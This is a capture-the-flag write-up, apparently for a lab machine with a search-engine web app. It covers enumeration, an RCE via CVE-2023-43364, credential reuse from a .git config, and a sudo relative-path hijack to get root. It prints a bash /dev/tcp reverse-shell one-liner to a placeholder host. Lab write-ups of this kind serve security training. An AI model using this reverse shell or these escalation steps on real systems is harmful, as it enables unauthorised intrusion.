## Initial Enumeration

A full port scan was run against the target to identify the exposed services and likely entry points.

```bash
nmap -sV -sC -p- --open 10.10.11.208 -T4 -A -vv -oN scan.txt
```

The target IP is added to `/etc/hosts` to resolve the hostname. The web application presents itself as a search engine, which suggests user input reaches a backend query and makes **SQL injection** worth considering.

## Web Application Analysis

Intercepting the search request in **Burp Suite** shows that the backend handles it through a PHP script.

![Intercepted search request](/assets/images/busqueda/87-1.png)
*The search request intercepted in Burp*

The bottom of the page discloses the application version, which narrows down the candidate vulnerabilities.

![Application version](/assets/images/busqueda/87-2.png)
*Application version disclosed in the footer*

The application builds search-engine URLs from user input, and that functionality is vulnerable to **remote code execution** through **CVE-2023-43364**.

## Remote Code Execution

Exploiting the RCE runs arbitrary commands on the target and establishes a reverse shell, which gives access to the `user.txt` flag.

![Reverse shell obtained](/assets/images/busqueda/87-3.png)
*Reverse shell from the RCE*

## Post-Exploitation & Lateral Movement

Local enumeration starts from the web application directory. A `.git` directory holds a configuration file with credentials that work over **SSH**.

![Credentials found in .git](/assets/images/busqueda/87-4.png)
*Credentials recovered from the .git directory*

Those credentials also upgrade the foothold to a stable SSH session.

![SSH access](/assets/images/busqueda/87-5.png)
*Stable SSH session established*

`sudo -l` shows that a specific command can be run as **root**.

![sudo privileges](/assets/images/busqueda/87-6.png)
*sudo rights for the current user*

## Privilege Escalation

Researching the allowed command points to a way to abuse it for root.

![Command execution as root](/assets/images/busqueda/87-7.png)
*Running the permitted command as root*

The existing files cannot be modified directly, but the script invokes its helper without an absolute path.

![File permissions](/assets/images/busqueda/87-8.png)
*Permissions on the target script*

That allows a malicious script of the same name to be placed in the current working directory so it runs instead. The first attempt fails because the new script lacks execute permissions.

![Execution permission issue](/assets/images/busqueda/87-9.png)
*The replacement script lacks execute permission*

After fixing the permissions, a reverse-shell payload is embedded in the script:

```bash
bash -i >& /dev/tcp/<YourIP>/<PORT> 0>&1
```

Running it returns a reverse shell as **root**, completing the escalation.
